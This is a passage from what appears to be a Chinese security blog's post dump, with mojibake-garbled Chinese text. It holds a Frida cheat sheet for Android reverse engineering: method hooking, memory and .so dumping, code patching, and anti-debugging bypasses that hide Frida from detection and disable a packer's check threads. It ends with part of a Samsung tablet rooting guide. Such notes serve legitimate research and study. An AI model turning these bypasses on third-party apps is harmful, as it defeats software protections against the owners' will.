&#123;0x1,0x2,0x3,0x4&#125;; parametersTest.addMethod(doubleArray); String str1 = \"acerwe\"; String str2 = \"werwed\"; parametersTest.addMethod(str1,str2); int intVal1 = 3; int intVal2 = 4; int retInt = parametersTest.multiply(intVal1,intVal2); byte byteVal1 = 0x1; byte byteVal2 = 0x2; byte retByte = parametersTest.multiply(byteVal1,byteVal2); long longVal1 = 0x3; long longVal2 = 0x4; long retLong = parametersTest.multiply(longVal1,longVal2); float floatVal1 = 0x3; float floatVal2 = 0x4; float retFloat = parametersTest.multiply(floatVal1,floatVal2); short shortVal1 = 0x3; short shortVal2 = 0x4; short retShort = parametersTest.multiply(shortVal1,shortVal2); double doubleVal1 = 0x3; double doubleVal2 = 0x4; double retDouble = parametersTest.multiply(doubleVal1,doubleVal2); &#125;&#125;frida è„šæœ¬ function getReflectFields(val1) &#123; var clazz = Java.use(\"java.lang.Class\"); var parametersTest = Java.cast(val1.getClass(),clazz); //getDeclaredFields ()ï¼šè¿”å›åæ˜ ç”±ç±»å¯¹è±¡è¡¨ç¤ºçš„ç±»æˆ–æ¥å£å£°æ˜çš„æ‰€æœ‰å­—æ®µçš„å­—æ®µå¯¹è±¡æ•°ç»„ï¼Œä¹Ÿå¯ä»¥ç®€å•çš„ç†è§£ä¸ºä¼šè¿”å›è¿™ä¸ªç±»æ‰€æœ‰çš„å¯¹è±¡ var fields = parametersTest.getDeclaredFields(); fields.forEach(function (field) &#123;// ä¾æ¬¡æ‰“å°å­—æ®µçš„ç±»å‹ã€åç§°ã€å€¼ send(\"field type is: \" + (field.getType())); send(\"field name is: \" + (field.getName())); send(\"field value is: \" + field.get(val1)); &#125;)&#125;function getReflectMethod(val1) &#123; try&#123; var clazz = Java.use(\"java.lang.Class\");// ä½¿ç”¨ java çš„ Class ç±» var parametersTest = Java.cast(val1.getClass(),clazz);// ç±»å‹è½¬æ¢ï¼Œå°† //getDeclaredMethods () è·å–æ‰€æœ‰æ–¹æ³• var methods = parametersTest.getDeclaredMethods(); methods.forEach(function (method) &#123; var methodName = method.getName(); var val1Class = val1.getClass(); var val1ClassName = Java.use(val1Class.getName()); var overloads = val1ClassName[methodName].overloads; overloads.forEach(function (overload) &#123; var proto = \"(\"; overload.argumentTypes.forEach(function (type) &#123; proto += type.className + \", \"; &#125;); if(proto.length > 1)&#123; proto = proto.substr(0 ,proto.length - 2); &#125; proto += \")\"; overload.implementation = function () &#123; var args = []; for(var j = 0; j &lt; arguments.length; j++)&#123; for(var i in arguments[j])&#123; var value = String(arguments[j][i]); send(val1ClassName + \".\" + methodName + \" and arguments value is: \" + value); &#125; args[j] = arguments[j] + \"\"; &#125; // æ‰“å°æ–¹æ³•å‚æ•° send(val1ClassName + \".\" + methodName + \" and args is: \" + args); // è°ƒç”¨æ–¹æ³• var retval = this[methodName].apply(this,arguments); // æ‰“å°æ–¹æ³•è¿”å›å€¼ send(methodName + \" return value is: \" + retval); return retval;// è¿”å›æ–¹æ³•è¿”å›å€¼ &#125; &#125;) &#125;) &#125;catch(e)&#123; send(\"'\" + val1 + \"' hook fail: \" + e); &#125; &#125;//hook parametersTestClass ç±»çš„ display æ–¹æ³•parametersTestClass.display.overload(\"com.example.parameterstest.ParametersTest\").implementation = function (val1) &#123; getReflectFields(val1);// æ‰“å°æ‰€æœ‰å­—æ®µï¼ˆfieldsï¼‰ç±»å‹ã€åç§°ã€å€¼ getReflectMethod(val1)//hook ParametersTest å¯¹è±¡çš„æ‰€æœ‰æ–¹æ³• this.display(val1);// è°ƒç”¨ display æ–¹æ³•&#125;# å¼€å¯ webview çš„ debug è°ƒè¯• function webview_debug() &#123; Java.perform(function () &#123; var WebView = Java.use('android.webkit.WebView'); WebView.$init.overloads.forEach(function(init) &#123; init.implementation = function() &#123; // è°ƒç”¨åŸå§‹æ„é€ æ–¹æ³• var instance = init.apply(this, arguments); // æ‰“å¼€ WebView çš„è°ƒè¯•åŠŸèƒ½ WebView.setWebContentsDebuggingEnabled(true); console.log('[*] WebView debug open~'); // è¿”å›å®ä¾‹ return instance; &#125;; &#125;); &#125;);&#125;# native å±‚ # dump å†…å­˜ä¸­çš„ so function dump_so(so_name) &#123; Java.perform(function () &#123; var currentApplication = Java.use(\"android.app.ActivityThread\").currentApplication(); var dir = currentApplication.getApplicationContext().getFilesDir().getPath(); var libso = Process.getModuleByName(so_name); console.log(\"[name]:\", libso.name); console.log(\"[base]:\", libso.base); console.log(\"[size]:\", ptr(libso.size)); console.log(\"[path]:\", libso.path); var file_path = dir + \"/\" + libso.name + \"_\" + libso.base + \"_\" + ptr(libso.size) + \".so\"; var file_handle = new File(file_path, \"wb\"); if (file_handle &amp;&amp; file_handle != null) &#123; Memory.protect(ptr(libso.base), libso.size, 'rwx'); var libso_buffer = ptr(libso.base).readByteArray(libso.size); file_handle.write(libso_buffer); file_handle.flush(); file_handle.close(); console.log(\"[dump]:\", file_path); &#125; &#125;);&#125;rpc.exports = &#123; dump_so: dump_so&#125;;# dump å†…å­˜ function dump_memory(start,size,filename) &#123; var file_path = \"/data/data/com.oacia.apk_protect/\" + filename; var file_handle = new File(file_path, \"wb\"); if (file_handle &amp;&amp; file_handle != null) &#123; var libso_buffer = start.readByteArray(size.toUInt32()); file_handle.write(libso_buffer); file_handle.flush(); file_handle.close(); console.log(\"[dump]:\", file_path); &#125;&#125;# hook native å±‚çš„å‡½æ•° function hook_native()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x131E20), &#123; onEnter: function (args) &#123; console.log(\"hook success!\") console.log(args[1]) console.log(args[2]) console.log(args[3]) &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;# hook å¯¼å‡ºå‡½æ•° function hook_export() &#123; Interceptor.attach(Module.findExportByName(\"libc.so\", \"pthread_create\"),&#123; onEnter(args)&#123; console.log(\"hook success\"); &#125;, onLeave: function (retval) &#123; &#125; &#125;)&#125;# hook jni å‡½æ•° æˆ‘ä»¬å¯ä»¥ç°åœ¨è¿™ä¸ªåœ°æ–¹æ‰¾åˆ° jni å‡½æ•°çš„å«ä¹‰ï¼Œç„¶åæ ¹æ®å‡½æ•°å‚æ•°çš„ç±»å‹å»å®šåˆ¶åŒ–è¾“å‡ºçš„æ‰“å° //hook GetStaticMethodID function hook_libart() &#123; var symbols = Module.enumerateSymbolsSync(\"libart.so\"); var addr_jni = null; for (var i = 0; i &lt; symbols.length; i++) &#123; var symbol = symbols[i]; if (symbol.name.indexOf(\"GetStaticMethodID\")!=-1) &#123; addr_jni = symbol.address; console.log(\"find \",symbol.name); console.log(\"[+] hook \",addr_jni); Interceptor.attach(addr_jni, &#123; onEnter: function (args) &#123; console.log(\"call GetStaticMethodID: \",symbol.name); console.log(\"name: \",args[2].readCString()); console.log(\"sig: \",args[3].readCString()); &#125;, onLeave: function (retval) &#123; console.log(\"return val\") console.log(retval); &#125; &#125;); &#125; &#125;&#125;# æšä¸¾æ‰€æœ‰ so function enum_so()&#123; Java.perform(function()&#123; // æšä¸¾å½“å‰åŠ è½½çš„æ¨¡å— var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; // åŒ…å« \"lib\" å­—ç¬¦ä¸²çš„ if(process_Obj_Module_Arr[i].path.indexOf(\"lib\")!=-1) &#123; console.log(\"æ¨¡å—åç§°:\",process_Obj_Module_Arr[i].name); console.log(\"æ¨¡å—åœ°å€:\",process_Obj_Module_Arr[i].base); console.log(\"å¤§å°:\",process_Obj_Module_Arr[i].size); console.log(\"æ–‡ä»¶ç³»ç»Ÿè·¯å¾„\",process_Obj_Module_Arr[i].path); &#125; &#125; &#125;);&#125;# æŸ¥è¯¢åœ°å€åœ¨å“ªä¸ª so ä¸­ function addr_in_so(addr)&#123; var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; console.log(addr.toString(16),\"is in\",process_Obj_Module_Arr[i].name,\"offset: 0x\"+(addr-process_Obj_Module_Arr[i].base).toString(16)); &#125; &#125;&#125;# patch å†…å­˜ æ–¹æ³•ä¸€ è¯¥æ–¹æ³•å­˜åœ¨ä¸¤ä¸ªé—®é¢˜ æ˜¯å¦å­˜åœ¨å¤šçº¿ç¨‹æ“çºµç›®æ ‡åœ°å€å¤„çš„å†…å­˜ï¼Ÿæ˜¯å¦æœ‰å†²çªï¼Ÿ arm çš„ç¼“å­˜åˆ·æ–°æœºåˆ¶ var str_name_so = \"libhookinunidbg.so\"; // è¦ hook çš„ so åvar n_addr_func_offset = 0x8CA; // è¦ hook çš„å‡½æ•°åœ¨å‡½æ•°é‡Œé¢çš„åç§»ï¼Œthumb è¦ + 1var n_addr_so = Module.findBaseAddress(str_name_so);var n_addr_assemble = n_addr_so.add(n_addr_func_offset);Memory.protect(n_addr_assemble, 4, 'rwx'); // ä¿®æ”¹å†…å­˜å±æ€§ï¼Œä½¿ç¨‹åºæ®µå¯å†™n_addr_assemble.writeByteArray([0x00, 0x20, 0x00, 0xBF]); æ–¹æ³•äºŒ var str_name_so = \"libhookinunidbg.so\"; // è¦ hook çš„ so åvar n_addr_func_offset = 0x8CA; // è¦ hook çš„å‡½æ•°åœ¨å‡½æ•°é‡Œé¢çš„åç§»ï¼Œthumb è¦ + 1var n_addr_so = Module.findBaseAddress(str_name_so);var n_addr_assemble = n_addr_so.add(n_addr_func_offset);// safely modify bytes at addressMemory.patchCode(n_addr_assemble, 4, function () &#123; // ä»¥ thumb çš„æ–¹å¼è·å–ä¸€ä¸ª patch å¯¹è±¡ var cw = new ThumbWriter(n_addr_assemble); // å°ç«¯åº // 00 20 cw.putInstruction(0x2000) // 00 BF cw.putInstruction(0xBF00); cw.flush(); // å†…å­˜åˆ·æ–° console.log(hexdump(n_addr_assemble))&#125;); # å†…å­˜æ£€ç´¢ function searchAndPatch() &#123; var module = Process.findModuleByName(\"libhookinunidbg.so\"); var pattern = \"80 b5 6f 46 84 b0 03 90 02 91\" var matches = Memory.scanSync(module.base, module.size, pattern); console.log(matches.length) if (matches.length !== 0) &#123; var n_addr_assemble = matches[0].address.add(10); // safely modify bytes at address Memory.patchCode(n_addr_assemble, 4, function () &#123; // ä»¥ thumb çš„æ–¹å¼è·å–ä¸€ä¸ª patch å¯¹è±¡ var cw = new ThumbWriter(n_addr_assemble); // å°ç«¯åº // 00 20 cw.putInstruction(0x2000) // 00 BF cw.putInstruction(0xBF00); cw.flush(); // å†…å­˜åˆ·æ–° console.log(hexdump(n_addr_assemble)) &#125;); &#125;&#125;setImmediate(searchAndPatch);# åœ¨ so åŠ è½½æ—¶å°±è¿›è¡Œ hook æ“ä½œ so åŠ è½½åçš„é¦–æ¬¡å‡½æ•°è°ƒç”¨æµç¨‹ä¸º init-&gt;initarray-&gt;JNI_Onload android_dlopen_ext å¯ä»¥åœ¨ JNI_Onload æ—¶è¿›è¡Œ hook function hook_dlopen(soName = '') &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); if (path.indexOf(soName) >= 0) &#123; this.is_can_hook = true; &#125; &#125; &#125;, onLeave: function (retval) &#123; if (this.is_can_hook) &#123; //do your own code &#125; &#125; &#125; );&#125;setImmediate(hook_dlopen, \"libsec2023.so\")é€šè¿‡ hook linker64 çš„ call_constructors å¯ä»¥ hook åˆ°åŠ è½½ so æ—¶çš„ init å‡½æ•° function hook_call_constructors() &#123; var symbols = Process.getModuleByName('linker64').enumerateSymbols(); var call_constructors_addr = null; var get_soname_addr = null; for (var i = 0; i &lt; symbols.length; i++) &#123; if (symbols[i].name.indexOf('call_constructors') !== -1) &#123; console.log(symbols[i].name) call_constructors_addr = symbols[i].address; &#125; else if (symbols[i].name.indexOf('get_soname') !== -1) &#123; console.log(symbols[i].name) get_soname_addr = symbols[i].address; &#125; &#125; Interceptor.attach(call_constructors_addr, &#123; onEnter: function(args) &#123; console.log(\"init call!\") &#125;, onLeave: function (args) &#123; &#125; &#125;);&#125;# é™å®šäºæŸå‡½æ•° æ¯”å¦‚æŸä¸ªå‡½æ•°åœ¨ SO ä¸­è¢«å¤§é‡ä½¿ç”¨ï¼Œç°åœ¨åªæƒ³åˆ†æè¿™ä¸ªå‡½æ•°åœ¨å‡½æ•° targetfunction ä¸­çš„ä½¿ç”¨ã€‚ var show = false;Interceptor.attach( Module.findExportByName(\"libc.so\", \"strcmp\"), &#123; onEnter: function(args) &#123; if(show)&#123; console.log(\"strcmp arg1:\"+args[0].readCString()) &#125; &#125;, onLeave: function(ret) &#123; &#125; &#125;);Interceptor.attach( Module.findExportByName(\"libhookinunidbg.so\", \"targetfunction\"),&#123; onEnter: function(args) &#123; show = this; &#125;, onLeave: function(ret) &#123; show = false; &#125; &#125;)# trace so ä¸­ native å‡½æ•°çš„è°ƒç”¨ stalker_trace_so ä½¿ç”¨ stalker_trace_so æ‰“å° so ä»åŠ è½½åˆ°å†…å­˜å¼€å§‹çš„æ‰€è°ƒç”¨çš„å‡½æ•° trace_natives ä½¿ç”¨ trace_natives å¯¹ ä¸€ä¸ª SO ä¸­çš„å…¨éƒ¨å‡½æ•°è¿›è¡Œ Traceï¼Œå¹¶å½¢æˆå¦‚ä¸‹è°ƒç”¨å›¾ã€‚ # æ‰“å°å †æ ˆ æ‰“å°å°½å¯èƒ½å‡†ç¡®çš„å †æ ˆä¿¡æ¯ console.log('RegisterNatives called from:\\\\n' + Thread.backtrace(this.context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join('\\\\n') + '\\\\n');æ‰“å°å°½å¯èƒ½å¤šçš„å †æ ˆä¿¡æ¯ console.log('RegisterNatives called from:\\\\n' + Thread.backtrace(this.context, Backtracer.FUZZY).map(DebugSymbol.fromAddress).join('\\\\n') + '\\\\n');å¦‚æœä¸Šé¢æ‰“å°å †æ ˆçš„ä»£ç æŠ¥é”™é€€å‡ºäº†ï¼Œå¯ä»¥æ‰‹åŠ¨æ‰“å° function addr_in_so(addr)&#123; var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; console.log(addr.toString(16),\"is in\",process_Obj_Module_Arr[i].name,\"offset: 0x\"+(addr-process_Obj_Module_Arr[i].base).toString(16)); &#125; &#125;&#125;Thread.backtrace(this.context, Backtracer.FUZZY).map(addr_in_so);# æ‰“å°å¯¼å…¥è¡¨ function hook_import()&#123; var imports=Module.enumerateImports(\"libjiagu_64.so\"); for(var i=0;i&lt;imports.length;i++)&#123; console.log(imports[i].name+\" \"+DebugSymbol.fromAddress(imports[i].address)); &#125;&#125;# æ‰“å°å¯„å­˜å™¨ // æ‰“å°æ‰€æœ‰çš„å¯„å­˜å™¨console.log(JSON.stringify(this.context))// æ‰“å°æŸä¸€ä¸ªçš„å¯„å­˜å™¨console.log(this.context.x0)# æ‰“å¼€å¹¶è¯»å–æŸä¸ªæ–‡ä»¶ function read_file()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x120C30), &#123; onEnter: function (args) &#123; const openPtr = Module.getExportByName('libc.so', 'open'); const open = new NativeFunction(openPtr, 'int', ['pointer', 'int']); var readPtr = Module.findExportByName(\"libc.so\", \"read\"); var read = new NativeFunction(readPtr, 'int', ['int', 'pointer', \"int\"]); var fileName = \"/data/data/com.oacia.apk_protect/lib/libjgdtc.so\"; var buffer = Memory.alloc(512); var realFd = open(Memory.allocUtf8String(fileName), 4); read(realFd, buffer, 512); console.log(hexdump(buffer, &#123; offset: 0,// ç›¸å¯¹åç§» length: 0x50,//dump çš„å¤§å° header: true, ansi: true &#125;)); &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;# å¸¸ç”¨åè°ƒè¯•å‡½æ•° dbus function anti_dbus()&#123; Interceptor.attach(Module.findExportByName(null, \"connect\"), &#123; // fd, buff, len onEnter: function (args) &#123; console.log(\"connect\") &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;strstr function anti_strstr()&#123; const strStr = Module.findExportByName(null, \"strstr\"); Interceptor.attach(strStr,&#123; onEnter: function(args)&#123; var haystackstr = args[0].readCString(); var needle_content = args[0].readCString(); if (haystackstr.indexOf('frida')!==-1 || needle_content.indexOf('frida')!==-1 || haystackstr.indexOf('gum-js-loop')!==-1 || needle_content.indexOf('gum-js-loop')!==-1 || haystackstr.indexOf('gmain')!==-1 || needle_content.indexOf('gmain')!==-1 || haystackstr.indexOf('linjector')!==-1 || needle_content.indexOf('linjector')!==-1)&#123; this.strstr_bypass=true &#125; &#125;, onLeave: function(retval)&#123; if(this.strstr_bypass)&#123; console.log(\"strstr bypass\") retval.replace(0x0); &#125; &#125; &#125;);&#125;readlink function anti_readlink()&#123; const readlink_ptr = Module.findExportByName(null, \"readlink\"); console.log('readlink_ptr: ', readlink_ptr); if(!readlink_ptr)&#123; return &#125; const readlink = new NativeFunction(readlink_ptr, 'int', ['pointer', 'pointer', 'pointer']) Interceptor.replace(readlink_ptr, new NativeCallback(function(path, buf, size)&#123; var retval = readlink(path, buf, size); var bufstr = buf.readCString(); console.log(bufstr) if (bufstr.indexOf('frida')!==-1 || bufstr.indexOf('gum-js-loop')!==-1 || bufstr.indexOf('gmain')!==-1 || bufstr.indexOf('linjector')!==-1)&#123; console.log(`\\nreadlink(path=$&#123;path.readCstring()&#125;, buf=$&#123;bufstr&#125;, size=$&#123;size&#125;`); this.buf.writeUtf8String(\"/system/framework/boot.art\") console.log(\"replce with: \"+ this.buf.readCString()) return 0x1A; &#125; return retval; &#125;, 'int', ['pointer', 'pointer', 'pointer']))&#125;TracerPid function check_TracerPid()&#123; var fgetsPtr = Module.findExportByName(\"libc.so\", \"fgets\"); var fgets = new NativeFunction(fgetsPtr, 'pointer', ['pointer', 'int', 'pointer']); Interceptor.replace(fgetsPtr, new NativeCallback(function (buffer, size, fp) &#123; var retval = fgets(buffer, size, fp); var bufstr = Memory.readUtf8String(buffer); //console.log(bufstr) if (bufstr.indexOf(\"TracerPid:\") > -1) &#123; console.log(bufstr); Memory.writeUtf8String(buffer, \"TracerPid:\\t0\"); console.log(\"tracerpid replaced: \" + Memory.readUtf8String(buffer)); &#125; return retval; &#125;, 'pointer', ['pointer', 'int', 'pointer']));&#125;pthread_create function check_pthread_create() &#123; var pthread_create_addr = Module.findExportByName(null, 'pthread_create'); var pthread_create = new NativeFunction(pthread_create_addr, \"int\", [\"pointer\", \"pointer\", \"pointer\", \"pointer\"]); Interceptor.replace(pthread_create_addr, new NativeCallback(function (parg0, parg1, parg2, parg3) &#123; var so_name = Process.findModuleByAddress(parg2).name; var so_path = Process.findModuleByAddress(parg2).path; var so_base = Module.getBaseAddress(so_name); var offset = parg2 - so_base; var PC = 0; if ((so_name.indexOf(\"jiagu\") > -1)) &#123; console.log(\"======\") console.log(\"find thread func offset\", so_name, offset.toString(16)); Thread.backtrace(this.context, Backtracer.ACCURATE).map(addr_in_so); var check_list = []//1769036,1771844 if (check_list.indexOf(offset)!==-1) &#123; console.log(\"check bypass\") &#125; else &#123; PC = pthread_create(parg0, parg1, parg2, parg3); &#125; &#125; else &#123; PC = pthread_create(parg0, parg1, parg2, parg3); &#125; return PC; &#125;, \"int\", [\"pointer\", \"pointer\", \"pointer\", \"pointer\"]))&#125;# python bridge # è®© frida spawn åˆ° app çš„å­è¿›ç¨‹ä¸Š å‡å¦‚ app çš„ä¸€ä¸ªå…³é”®é€»è¾‘æ˜¯è¿è¡Œåœ¨å­è¿›ç¨‹ä¸Šé¢çš„ï¼Œé‚£ä¹ˆå°±å¾ˆæœ‰å¯èƒ½å‡ºç°æˆ‘ä»¬ hook äº†è¿™ä¸ªè¿›ç¨‹ï¼Œä½†ä»€ä¹ˆéƒ½æ²¡ hook åˆ°çš„æƒ…å†µï¼Œå¯¹äºè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ frida çš„ child_gating æœºåˆ¶ï¼Œè®© frida ä¹Ÿèƒ½å¤Ÿé™„åŠ åˆ°å­è¿›ç¨‹ä¸Šé¢ import codecsimport fridaimport sysimport threadingdevice = frida.get_device_manager().add_remote_device(\"127.0.0.1:1234\")pending = []sessions = []scripts = []event = threading.Event()jscode = open('./hook.js', 'r', encoding='utf-8').read()pkg = \"tv.danmaku.bili\" #åŒ…ådef spawn_added(spawn): event.set() if spawn.identifier == pkg or spawn.identifier == f\"&#123;pkg&#125;:web\": print('spawn_added:', spawn) session = device.attach(spawn.pid) script = session.create_script(jscode) script.on('message', on_message) script.load() device.resume(spawn.pid)def spawn_removed(spawn): print('spawn_removed:', spawn) event.set()def on_message(spawn, message, data): print('on_message:', spawn, message, data)def on_message(message, data): if message['type'] == 'send': print(\"[*] &#123;0&#125;\".format(message['payload'])) else: print(message)device.on('spawn-added', spawn_added)device.on('spawn-removed', spawn_removed)device.enable_spawn_gating()event = threading.Event()print('Enabled spawn gating')pid = device.spawn([pkg])session = device.attach(pid)print(\"[*] Attach Application id:\", pid)device.resume(pid)sys.stdin.read()","categories":[],"tags":[{"name":"frida","slug":"frida","permalink":"https://oacia.dev/tags/frida/"},{"name":"å®‰å“é€†å‘","slug":"å®‰å“é€†å‘","permalink":"https://oacia.dev/tags/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"}]},{"title":"å¯¹SM-P200å¹³æ¿çš„rootè®°å½•","slug":"å¯¹SM-P200å¹³æ¿çš„rootè®°å½•","date":"2023-04-02T09:33:17.000Z","updated":"2023-07-01T03:53:38.482Z","comments":true,"path":"å¯¹SM-P200å¹³æ¿çš„rootè®°å½•/","link":"","permalink":"https://oacia.dev/%E5%AF%B9SM-P200%E5%B9%B3%E6%9D%BF%E7%9A%84root%E8%AE%B0%E5%BD%95/","excerpt":"","text":"è¿™æ®µæ—¶é—´å­¦ä¹ å®‰å“é€†å‘çš„è¿‡ç¨‹ä¸­ï¼Œæ€¥éœ€ä¸€å° root æœºï¼Œä¸€å¼€å§‹æƒ³æŠŠè‡ªå·±çš„æ‰‹æœº root äº†ï¼Œä½†æ˜¯è€ƒè™‘åˆ° root çš„è¿‡ç¨‹ä¸­ä¼šæ¸…é™¤æ‰€æœ‰æ•°æ®ï¼Œæ‰€ä»¥å°±æƒ³ç€æ¢ä¸€å°å¤‡ç”¨æœºå» root, æ­£å¥½è¿‡å»é«˜ä¸­çš„æ—¶å€™è¢«å­¦æ ¡å¼ºåˆ¶è¦æ±‚ä¹°äº†ä¸€å°ä¸‰æ˜Ÿçš„ SM-P200 å¹³æ¿ï¼Œé«˜ä¸­è¿‡åè¿™å¹³æ¿ä¹Ÿé—²ç½®äº†ä¸‹æ¥ï¼Œæ­£å¥½ä»Šå¤©æœ‰éœ€è¦ï¼Œå°±æŠŠä»–æ‹¿å‡ºæ¥ï¼ŒèŠ±äº†ä¸¤å¤©æ—¶é—´ç»ˆäºå°†å¹³æ¿ root å¥½äº†ï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹å¹³æ¿ root çš„è¿‡ç¨‹ å¯¹äºä¸‰æ˜Ÿç³»åˆ—æ‰‹æœºå¹³æ¿çš„ root æˆ‘çš„å»ºè®®æ˜¯å‚è€ƒæ­¤å¤„ # 0x01 ä¸‹è½½ä¸‰æ˜Ÿå®˜æ–¹åŸç‰ˆåˆ·æœºåŒ… è¿™æ˜¯æœ€é‡è¦çš„ä¸€æ­¥ï¼Œä½ éœ€è¦å»ç½‘ä¸Šä¸‹è½½å®˜æ–¹åŸç‰ˆçš„åˆ·æœºåŒ…ï¼Œæ ¼å¼ç±»ä¼¼äºè¿™ç§ AP , BL , CSC å¦‚æœæœ‰å…´è¶£äº†è§£è¿™äº›ä¸åŒåç§°çš„åˆ·æœºåŒ…çš„ä½œç”¨ï¼Œå¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç«  å¦‚æœæ˜¯ SM-P200 å‹å·çš„ä¸‰æ˜Ÿå¹³æ¿çš„è¯ï¼Œå¯ä»¥ç›´æ¥ä¸‹è½½æˆ‘å…ˆå‰å·²ç»è´­ä¹°çš„å®˜æ–¹åŸç‰ˆåˆ·æœºåŒ… (èŠ±äº†äº”å—å¤§æ´‹å˜) ä¸‹è½½åœ°å€ï¼šhttps://pan.baidu.com/s/1zL0K1tskeKtppqEQ6-RYvg æå–ç ï¼š467m ä¸‹è½½çš„æ˜¯ä¸€ä¸ª .zip å‹ç¼©åŒ…ï¼Œè§£å‹ä¹‹åå°±æœ‰ä¸Šå›¾æ‰€ç¤ºçš„æ–‡ä»¶äº† å¦‚æœå‹å·ä¸ä¸€æ ·çš„è¯ï¼Œé‚£åªèƒ½å»ç½‘ä¸Šæ‰¾æ‰¾å•¦ # 0x02 è§£é” BL é” (Bootloader) Q: ä¸ºä»€ä¹ˆéœ€è¦è§£é” BL é”ï¼Ÿ A: BL é”çš„ä½œç”¨æ˜¯é˜»æ­¢ä½ ä½¿ç”¨éå®˜ç½‘çš„åˆ·æœºåŒ…è¿›è¡Œåˆ·æœºï¼Œä¸è§£é” BL é”ï¼Œé‚£ä¹ˆ root å°†ä¼šå¤±è´¥çš„ æ³¨æ„ï¼šè§£é” BL é”çš„è¿‡ç¨‹å°†ä¼šæ¸…é™¤å¹³æ¿çš„æ‰€æœ‰æ•°æ®ï¼Œè¯·åŠæ—¶åšå¥½æ•°æ®çš„å¤‡ä»½ï¼ é¦–å…ˆéœ€è¦æ‰“å¼€å¹³æ¿çš„å¼€å‘è€…é€‰é¡¹ï¼Œç„¶åå¼€å¯ OEMè§£é” é€‰é¡¹ é‡å¯æ‰‹æœºï¼Œå¯¹äºä¸‰æ˜Ÿæ‰‹æœºæ¥è¯´ï¼Œä½ éœ€è¦åœ¨é‡å¯çš„è¿‡ç¨‹ä¸­åŒæ—¶æŒ‰ä½ éŸ³é‡+ å’Œ éŸ³é‡- è¿™ä¸¤ä¸ªé”®ï¼Œç„¶åå°±ä¼šå‡ºç°ä¸€ä¸ªæç¤ºç•Œé¢ï¼Œä¸€ç›´ YES ç‚¹ä¸‹å»å°±å¯ä»¥å•¦ æ‰‹æœºé‡å¯ä¹‹åå†æ¬¡è¿›å…¥ è®¾ç½®-å¼€å‘è€…é€‰é¡¹ ï¼Œå¦‚æœ OEMè§£é” è¿™ä¸ªé€‰é¡¹å˜æˆç°è‰²çš„ï¼Œé‚£ä¹ˆå°±è¯´æ˜ BL é”å·²ç»è§£é”æˆåŠŸäº† å¦‚æœè¿˜æ˜¯å¯¹è§£é”è¿‡ç¨‹ä¸å¤§æ¸…æ¥šçš„è¯ï¼Œå¯ä»¥å» b ç«™ä¸Šçœ‹çœ‹è¿™ä¸ªè§†é¢‘ # 0x03 ä½¿ç”¨ Magisk å°†åˆ·æœºåŒ…ä¸­çš„ AP æ–‡ä»¶åˆ·å…¥ root æƒé™ Magisk ä¸‹è½½åœ°å€: https://github.com/topjohnwu/Magisk/releases ä¸‹è½½å®Œ apk æ–‡ä»¶åï¼Œå°†å¹³æ¿ç”¨æ•°æ®çº¿å’Œç”µè„‘è¿æ¥èµ·æ¥ï¼Œç„¶åç”¨ adb install Magisk.apk å‘½ä»¤è¿›è¡Œå®‰è£…ï¼Œä¹‹åå°†åˆ·æœºåŒ…ä¸­ AP å¼€å¤´çš„æ–‡ä»¶å¤åˆ¶åˆ°å¹³æ¿çš„æ ¹ç›®å½•ä¸­ å¦‚æœä¸æ¸…æ¥šå¦‚ä½•å¤åˆ¶æ–‡ä»¶åˆ°æ ¹ç›®å½•ï¼Œå…·ä½“æ–¹æ³•æ˜¯ç”¨æ•°æ®çº¿è¿æ¥ç”µè„‘åï¼Œä½ å°†åœ¨ æ­¤ç”µè„‘ å¤„çœ‹åˆ° åŒå‡»ç‚¹è¿›å»ï¼Œè¿›å…¥è¿™ä¸ªç›®å½•ä¸­ ç„¶åæŠŠå…ˆå‰ä¸‹è½½çš„ APæ–‡ä»¶ å¤åˆ¶ç²˜è´´è¿‡å»å°±è¡Œäº† ä¹‹åæ‰“å¼€ Magisk , ä¾æ¬¡ç‚¹å‡» å®‰è£…-&gt;å®‰è£…åˆ°Recovery-&gt;ä¸‹ä¸€æ­¥-&gt;é€‰æ‹©å¹¶ä¿®è¡¥ä¸€ä¸ªæ–‡ä»¶ ï¼Œç„¶åé€‰æ‹©å…ˆå‰å¤åˆ¶è¿‡å»çš„ AP å¼€å¤´çš„æ–‡ä»¶ï¼Œç‚¹å‡»å¼€å§‹ååç­‰ Magisk æç¤º ALL done å°±å¯ä»¥äº† éšåå†æ¬¡åœ¨ç”µè„‘ä¸Šè¿›å…¥ æ­¤ç”µè„‘\\Galaxy Tab A with S Pen\\Tablet\\Download ç›®å½•ï¼Œä½ åº”è¯¥å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ° Magisk æœ€æ–°ä¿®è¡¥å¥½çš„æ–‡ä»¶ï¼Œå°†å…¶å¤åˆ¶åˆ°ç”µè„‘ä¸Š # 0x04 ä½¿ç”¨ Odin3 å¯¹ä¸‰æ˜Ÿå¹³æ¿è¿›è¡Œåˆ·æœº Odin3-v3.14.4 ä¸‹è½½è¿æ¥ï¼š https://www.ydfile.com/file/odin/Odin3_v3.14.4.html å½“ç”¨ USB 